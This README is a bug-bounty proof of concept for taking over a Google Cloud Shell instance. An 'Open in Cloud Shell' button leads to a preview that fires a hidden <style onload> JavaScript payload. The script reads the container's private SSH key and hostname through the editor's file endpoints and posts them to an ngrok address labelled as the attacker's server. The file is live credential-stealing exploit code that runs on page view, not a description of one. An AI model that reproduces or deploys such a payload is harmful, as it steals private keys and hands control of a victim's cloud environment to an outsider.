# Google VRP testing  
Google cloudshell instance take over (as root)

[![Open in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)](https://ssh.cloud.google.com/cloudshell/editor?page=editor&cloudshell_git_repo=https:%2F%2Fgithub.com%2Fomespino%2Fgcs_instace_takeover.git&cloudshell_open_in_editor=readme.md)

## Getting Started 
just need to preview this file to see the magic 
 
<style onload="{   
    var file_results = []  
    // this scape the container and get the ssh id_cloudshell private key
    read_file('file:///../id_cloudshell')          
    // getting the hostname (external connection)
    read_file('file:///etc/hostname')      
         
    setTimeout(function(){ 
        send_files(file_results)    
    },5000)  
 
    // function to read any file given the path with file protocol per example 'file:///etc/hostname'
    function read_file(file_to_read){
        var container_url = 'https://' + location.host + '/files/?uri='
        var get_file_id_url = container_url + file_to_read
        console.log(get_file_id_url) 
        fetch(get_file_id_url) // convert response to json 
            .then(response => { return response.json() } )
            .then(json => {
                var container_download_url = 'https://' + location.host + '/files/download/?id='
                var download_url = container_download_url + json.id
                fetch(download_url) 
                    .then(response => { return response.text() } )
                    .then(text => { 
                        console.log(file_to_read + ' '+ text)
                        file_results.push(file_to_read + ' '+ text)  
                    })
            })  
    }
 
    function send_files(result){ 
         // need to set netcat to listen per example nc -lvvv 55555
         let attacker_server =  ' https://56051573.ngrok.io'
         fetch(attacker_server, {
                method: 'post',
                body: JSON.stringify(result)
         })
    }
 
}"> 
  
 
